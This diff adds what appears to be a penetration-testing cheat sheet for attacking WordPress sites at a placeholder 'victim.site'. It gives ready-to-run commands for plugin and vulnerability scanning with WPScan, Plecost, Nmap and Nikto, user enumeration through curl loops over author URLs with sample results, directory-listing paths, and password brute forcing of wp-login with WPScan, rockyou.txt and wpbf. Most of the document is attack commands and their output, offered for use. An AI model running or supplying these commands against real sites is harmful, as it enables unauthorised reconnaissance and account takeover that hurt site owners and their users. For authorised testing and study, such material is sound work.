@@ -1,0 +1,82 @@
+############################################################
+WPScan
+// non-intrusive scan
+# wpscan --url http://victim.site
+
+// user enumeration
+# wpscan --url http://victim.site --enumerate u
+
+// update wpscan
+# wpscan --update
+
+// enumerate most popular plugins
+# wpscan --url http://victim.site --enumerate p
+############################################################
+Plecost
+// command for identifying installed plugins, versions and related vulnerabilities
+# plecost -i /usr/share/plecost/wp_plugin_list.txt http://victim.site
+############################################################
+Nmap NSE Scripts
+# nmap --script http-wordpress-enum victim.site
+############################################################
+Nikto
+# nikto -host http://victim.site/wp-content
+############################################################
+User Dictionary Method
+############################################################
+Curl
+// user doesn't exist
+# curl -s -o /dev/null -w "%{http_code}\n" http://victim.site/author/usr
+Result: 404
+
+// user exist with 301 http status
+# curl -s -o /dev/null -w "%{http_code}\n" http://victim.site/author/user
+Result: 301
+
+User Enumeration with Bash "for" loop w/ User Dictionary
+# for i in $(cat users.txt); \
+  do curl -s -o /dev/null -w "%{http_code}:$i\n" \
+  http://victim.site/author/$i; done
+ 
+Results:
+404:steph
+404:joe
+301:admin
+404:pete
+404:frank
+301:user
+############################################################
+Brute Force Method
+
+# for i in {1..5}; \
+  do curl -L -s http://victim.site/?author=$i \
+  | grep -iPo '(?<=<title>)(.*)(?=</title>)' \
+  | cut -f1 -d" " |grep -v "Page"; done
+
+Results:
+user
+admin
+############################################################
+Directory indexing/listing
+// Browse in the URL wp-content
+victim.site/wp-content/
+
+// Browse in the URL wp-content the plugins
+victim.site/wp-content/plugins/
+
+// Browse in the URL wp-content the changelog.txt or readme.txt for version of plugins
+victim.site/wp-content/plugins/all-in-one-wp-migration
+victim.site/wp-content/plugins/all-in-one-wp-migration/readme.txt
+victim.site/wp-content/plugins/all-in-one-wp-migration/changelog.txt
+############################################################
+Bruteforce Atatcks
+
+victim.site/wp-login.php
+victim.site/wp-admin/wp-admin.php
+
+Bruteforce with WPScan
+# wpscan --url http://victim.site --wordlist /usr/share/wordlists/rockyou.txt --username admin
+
+Bruteforce with wpbf (https://github.com/atarantini/wpbf)
+# python wpbf.py -w passwords.txt -u admin http://victim.site
+
